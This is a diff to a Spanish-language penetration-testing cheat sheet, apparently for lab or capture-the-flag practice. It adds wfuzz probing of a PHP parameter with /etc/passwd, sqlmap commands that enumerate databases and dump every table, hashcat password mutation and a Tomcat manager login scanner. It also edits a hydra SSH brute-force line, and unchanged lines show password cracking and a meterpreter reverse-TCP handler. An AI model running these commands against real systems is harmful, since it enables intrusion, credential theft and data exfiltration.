@@ -129,6 +129,12 @@ ffuf -w (RutaDeWordlist) -u http://IP/ruta/FUZZ -c -ic -fc 403,404 -e .txt,.zip,
 
 dirb (ip o url) (RutaDeWordlist) [fuerza rutas ocultas en un sitio web usando una wordlist]
 
+wfuzz -u 'http://pagina/archivo.php?FUZZ=/etc/passwd' -w /ruta/wordlist -t 5 [fuerza una posible ruta oculta en donde esta FUZZ, que pueda ejecutar un comando, con -t 5 para no saturar la maquina y preferible usar una wordlist chica]
+
+sqlmap -r (archivo.sql) --dbs [ejecuta un ataque de inyección SQL usando una petición HTTP guardada en el archivo archivo.sql para detectar y listar las bases de datos del servidor objetivo]
+
+sqlmap -r (archivo.sql) -D (USUARIOS) --dump-all [extrae y muestra todo el contenido de todas las tablas dentro de la base de datos llamada por ejemplo USUARIOS, usando la petición HTTP del archivo archivo.sql]
+
 curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]
 
 curl -T archivo (ip/dir/archivo) --http1.0 [sirve para subir un archivo a un servidor web usando el método HTTP PUT bajo la versión HTTP/1.0]
@@ -143,7 +149,9 @@ john --wordlist=(RutaDeWordlist) --pot=contraseñaguardada.pot otroarchivo [usa 
 
 john --format=sha512crypt --wordlist=(RutaDeWordlist) --pot=contraseñasdesifradas.pot contraseñas.hash [usa John the Ripper indicando el formato de encriptación de sha512 para descifrarlas a partir de un hash y guardarlo con el parámetro pot]
 
-hydra -l (usuario) -P (RutaDeWordlist) ssh://IP [realiza un ataque de fuerza bruta al servicio SSH usando el usuario "admin" y la wordlist "rockyou.txt" para intentar encontrar la contraseña]
+hashcat --force (contraseña) -r /usr/share/hashcat/rules/best64.rule --stdout > variaciones.txt [genera variaciones posibles de la contraseña aplicando las reglas del archivo best64.rule y muestra las combinaciones en variaciones.txt]
+
+hydra -L (usuario) -P (RutaDeWordlist) ssh://IP [realiza un ataque de fuerza bruta al servicio SSH usando el usuario "admin" y la wordlist "rockyou.txt" para intentar encontrar la contraseña]
 
 script /dev/null -c bash [sirve para convertir una shell limitada en una terminal interactiva completa que soporte comandos, flechas y autocompletado]
 
@@ -424,5 +432,7 @@ exploit/multi/handler [Generic Payload Handler] {
   payload/php/meterpreter_reverse_tcp
 
 }
+
+scanner/http/tomcat_mgr_login [Tomcat Application Manager Login Utility]
 
     </code>
